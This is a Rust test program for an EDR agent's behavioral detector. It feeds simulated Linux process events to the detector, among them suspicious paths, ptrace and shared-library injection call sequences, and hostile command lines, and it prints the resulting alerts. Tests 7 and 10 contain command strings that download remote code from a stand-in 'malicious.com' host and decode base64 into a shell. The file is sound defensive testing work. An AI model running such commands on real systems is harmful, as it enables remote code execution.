use std::collections::HashMap;
use tokio::sync::mpsc;
use edr_agent::detectors::behavioral::BehavioralDetector;
use edr_agent::config::BehavioralDetectorConfig;
use edr_agent::events::{Event, EventData, ProcessEventData, EventType};
use edr_agent::detectors::Detector;
use chrono::Utc;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("🔍 Testing Linux Detection Capabilities");
    
    // Create detector configuration with all required fields
    let config = BehavioralDetectorConfig {
        enabled: true,
        scan_interval_ms: 1000,
        alert_threshold: 0.4,
        prevention_threshold: 0.8,
        track_api_calls: true,
        monitor_memory_operations: true,
        monitor_thread_operations: true,
        cross_platform_detection: true,
        system_process_contexts: HashMap::new(),
        alert_frequency_limits: HashMap::new(),
        path_context_rules: HashMap::new(),
        network_behavior_rules: HashMap::new(),
        time_based_risk_adjustment: Default::default(),
        process_whitelist: Default::default(),
    };
    
    let (alert_sender, mut alert_receiver) = mpsc::channel(100);
    
    // Create behavioral detector
    let detector = BehavioralDetector::new(
        config,
        alert_sender,
        "test-agent".to_string(),
        "test-host".to_string(),
    ).await?;
    
    detector.start().await?;
    
    println!("✅ Behavioral detector started");
    
    // Test 1: systemd in expected location (should have reduced risk)
    println!("\n📋 Test 1: systemd process in expected location");
    let systemd_expected_event = create_test_process_event(
        1,
        "systemd".to_string(),
        "/lib/systemd/systemd".to_string(),
        Some(0),
    )?;
    
    detector.process_event(&systemd_expected_event).await?;
    
    // Test 2: systemd in unexpected location (should trigger alert)
    println!("📋 Test 2: systemd process in unexpected location");
    let systemd_suspicious_event = create_test_process_event(
        2,
        "systemd".to_string(),
        "/tmp/systemd".to_string(),
        Some(1),
    )?;
    
    detector.process_event(&systemd_suspicious_event).await?;
    
    // Test 3: Shell execution from suspicious location
    println!("📋 Test 3: Shell process in suspicious location");
    let shell_suspicious_event = create_test_process_event(
        3,
        "bash".to_string(),
        "/tmp/bash".to_string(),
        Some(1000),
    )?;
    
    detector.process_event(&shell_suspicious_event).await?;
    
    // Test 4: Shell with suspicious parent process simulation
    println!("📋 Test 4: Shell process execution from /dev/shm");
    let shell_devshm_event = create_test_process_event(
        4,
        "sh".to_string(),
        "/dev/shm/malicious_script".to_string(),
        Some(2000),
    )?;
    
    detector.process_event(&shell_devshm_event).await?;
    
    // Test 5: Process execution from browser cache
    println!("📋 Test 5: Process execution from browser cache directory");
    let browser_cache_event = create_test_process_event(
        5,
        "suspicious_binary".to_string(),
        "/home/user/.cache/mozilla/firefox/evil_binary".to_string(),
        Some(3000),
    )?;
    
    detector.process_event(&browser_cache_event).await?;
    
    // Test 6: Normal process in expected location
    println!("📋 Test 6: Normal process in expected location");
    let normal_event = create_test_process_event(
        6,
        "ls".to_string(),
        "/bin/ls".to_string(),
        Some(1000),
    )?;
    
    detector.process_event(&normal_event).await?;
    
    // Test 7: Process with suspicious command line
    println!("📋 Test 7: Process with suspicious command line");
    let suspicious_cmd_event = create_test_process_event_with_cmdline(
        7,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(1000),
        Some("bash -c 'curl http://malicious.com/payload | bash'".to_string()),
    )?;
    
    detector.process_event(&suspicious_cmd_event).await?;
    
    // Test 8: Linux ptrace injection simulation
    println!("📋 Test 8: Linux ptrace injection sequence");
    let ptrace_event = create_process_with_api_calls(
        8,
        "suspicious_injector".to_string(),
        "/tmp/injector".to_string(),
        vec![
            ("ptrace", "PTRACE_ATTACH"),
            ("mmap", "PROT_READ|PROT_WRITE|PROT_EXEC"),
            ("mprotect", "PROT_EXEC"),
        ],
    )?;
    
    detector.process_event(&ptrace_event).await?;
    
    // Test 9: Linux .so injection attack
    println!("📋 Test 9: Linux shared library (.so) injection attack");
    let so_injection_event = create_process_with_api_calls(
        9,
        "ld_preload_attack".to_string(),
        "/tmp/fake_updater".to_string(),  // Suspicious location
        vec![
            ("dlopen", "/tmp/malicious.so"),
            ("dlsym", "hook_function"),
            ("mprotect", "PROT_EXEC"),  // Making memory executable
        ],
    )?;
    
    detector.process_event(&so_injection_event).await?;
    
    // Test 10: Command line with injection indicators
    println!("📋 Test 10: Shell with injection patterns");
    let injection_cmd_event = create_test_process_event_with_cmdline(
        10,
        "bash".to_string(),
        "/bin/bash".to_string(),
        Some(1000),
        Some("echo 'payload' | base64 -d | bash; ptrace -p 1234".to_string()),
    )?;
    
    detector.process_event(&injection_cmd_event).await?;
    
    // Give some time for processing
    tokio::time::sleep(std::time::Duration::from_millis(100)).await;
    
    // Check for alerts
    println!("\n🚨 Checking for generated alerts...");
    let mut alert_count = 0;
    
    // Use a timeout to avoid blocking indefinitely
    while let Ok(Some(alert)) = tokio::time::timeout(
        std::time::Duration::from_millis(500),
        alert_receiver.recv()
    ).await {
        alert_count += 1;
        println!("Alert #{}: {}", alert_count, alert.title);
        println!("  Description: {}", alert.description);
        println!("  Severity: {:?}", alert.severity);
        
        if let Some(risk_score) = alert.metadata.get("risk_score") {
            println!("  Risk Score: {}", risk_score);
        }
        
        if let Some(processes) = alert.metadata.get("affected_processes") {
            println!("  Affected Processes: {}", processes);
        }
        
        if !alert.recommended_actions.is_empty() {
            println!("  Recommended Actions:");
            for action in &alert.recommended_actions {
                println!("    - {}", action);
            }
        }
        println!();
    }
    
    if alert_count == 0 {
        println!("ℹ️  No alerts generated - this might indicate the detector is working correctly");
        println!("   for legitimate processes, or detection thresholds may need adjustment.");
    } else {
        println!("📊 Total alerts generated: {}", alert_count);
    }
    
    println!("\n✅ Linux detection capabilities test completed");
    println!("🔍 Tested capabilities:");
    println!("   • System process context recognition (systemd, init)");
    println!("   • Suspicious path detection (/tmp, /dev/shm, browser cache)");
    println!("   • Shell execution monitoring");
    println!("   • Command line pattern analysis");
    println!("   • Process injection sequence detection (ptrace patterns)");
    println!("   • Linux shared library (.so) injection monitoring (dlopen/dlsym)");
    println!("   • Memory operation tracking indicators");
    println!("   • Risk scoring and alert generation");
    
    Ok(())
}

fn create_test_process_event(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

fn create_test_process_event_with_cmdline(
    pid: u32,
    name: String,
    path: String,
    ppid: Option<u32>,
    command_line: Option<String>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid,
            name,
            path,
            command_line,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata: HashMap::new(),
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}

fn create_process_with_api_calls(
    pid: u32,
    name: String,
    path: String,
    api_calls: Vec<(&str, &str)>,
) -> Result<Event, Box<dyn std::error::Error>> {
    let mut metadata = HashMap::new();
    
    // Add API call information to metadata
    for (i, (api, params)) in api_calls.iter().enumerate() {
        metadata.insert(format!("api_call_{}", i), format!("{}({})", api, params));
    }
    
    // Add injection indicators
    if api_calls.iter().any(|(api, _)| *api == "ptrace") {
        metadata.insert("injection_indicator".to_string(), "ptrace_usage".to_string());
    }
    
    if api_calls.iter().any(|(api, _)| *api == "mprotect") {
        metadata.insert("memory_indicator".to_string(), "executable_memory".to_string());
    }
    
    let event = Event {
        id: uuid::Uuid::new_v4().to_string(),
        timestamp: Utc::now(),
        event_type: EventType::ProcessCreated,
        source: "injection_test".to_string(),
        agent_id: "test-agent".to_string(),
        hostname: "test-host".to_string(),
        data: EventData::Process(ProcessEventData {
            pid,
            ppid: Some(1),
            name,
            path,
            command_line: None,
            user: Some("testuser".to_string()),
            session_id: Some(1),
            start_time: Some(Utc::now()),
            end_time: None,
            exit_code: None,
            cpu_usage: None,
            memory_usage: None,
            environment: None,
            hashes: None,
        }),
        metadata,
        content_hash: None,
        security_critical: false,
    };
    
    Ok(event)
}
